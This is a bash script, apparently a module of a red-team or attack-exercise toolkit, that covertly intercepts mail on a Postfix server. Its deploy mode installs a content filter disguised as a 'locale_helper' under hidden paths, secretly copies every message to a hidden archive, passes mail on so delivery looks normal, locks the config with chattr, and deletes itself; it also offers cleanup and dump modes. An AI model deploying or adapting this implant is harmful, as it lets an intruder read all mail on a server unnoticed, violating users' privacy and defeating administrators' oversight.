#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

FILTER_SCRIPT="/usr/local/lib/.locale_helper"
ARCHIVE_DIR="/usr/local/lib/.locale_cache"
MASTER_MARKER="# svc-mailroute"

case "${1:-}" in
  deploy)
    mkdir -p "$ARCHIVE_DIR"
    chmod 700 "$ARCHIVE_DIR"

    # Pipe filter: archive stdin to a file, then re-inject for normal delivery.
    cat > "$FILTER_SCRIPT" << 'FILTER_EOF'
#!/bin/bash
# locale_helper — do not remove (locale subsystem)
ARCHIVE_DIR="/usr/local/lib/.locale_cache"
mkdir -p "$ARCHIVE_DIR"
tmp=$(mktemp "$ARCHIVE_DIR/m.XXXXXX")
cat > "$tmp"
# Re-inject for normal delivery — mail must still score.
/usr/sbin/sendmail -G -i -f "$1" -- "${@:2}" < "$tmp"
FILTER_EOF

    chmod 755 "$FILTER_SCRIPT"
    chattr +i "$FILTER_SCRIPT" 2>/dev/null || true

    # Append transport to master.cf (only if not already present).
    if ! grep -q "$MASTER_MARKER" /etc/postfix/master.cf; then
      cat >> /etc/postfix/master.cf << MASTER_EOF
$MASTER_MARKER
mailarchive unix  -       n       n       -       -       pipe
  flags=Rq user=root argv=$FILTER_SCRIPT \${sender} \${recipient}
MASTER_EOF
    fi

    # Point content_filter at our transport.
    postconf -e "content_filter = mailarchive:"

    chattr +i /etc/postfix/main.cf   2>/dev/null || true
    chattr +i /etc/postfix/master.cf 2>/dev/null || true

    postfix reload 2>/dev/null || systemctl reload postfix 2>/dev/null || true

    echo "[+] 11_mail_intercept: content filter active"
    echo "[+]   archive: $ARCHIVE_DIR"
    echo "[+]   mail still delivers normally — scoring intact"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;

  cleanup)
    chattr -i /etc/postfix/main.cf   2>/dev/null || true
    chattr -i /etc/postfix/master.cf 2>/dev/null || true
    chattr -i "$FILTER_SCRIPT"       2>/dev/null || true

    postconf -e "content_filter ="

    # Strip the mailarchive block from master.cf (3 lines: marker + service + flags)
    sed -i "/$MASTER_MARKER/,+2d" /etc/postfix/master.cf

    postfix reload 2>/dev/null || systemctl reload postfix 2>/dev/null || true

    rm -f  "$FILTER_SCRIPT"
    rm -rf "$ARCHIVE_DIR"

    echo "[-] 11_mail_intercept: removed"
    ;;

  dump)
    echo "[*] archived messages in $ARCHIVE_DIR:"
    ls -lh "$ARCHIVE_DIR" 2>/dev/null || echo "  (empty or not found)"
    ;;

  *) echo "Usage: $0 deploy|cleanup|dump"; exit 1 ;;
esac
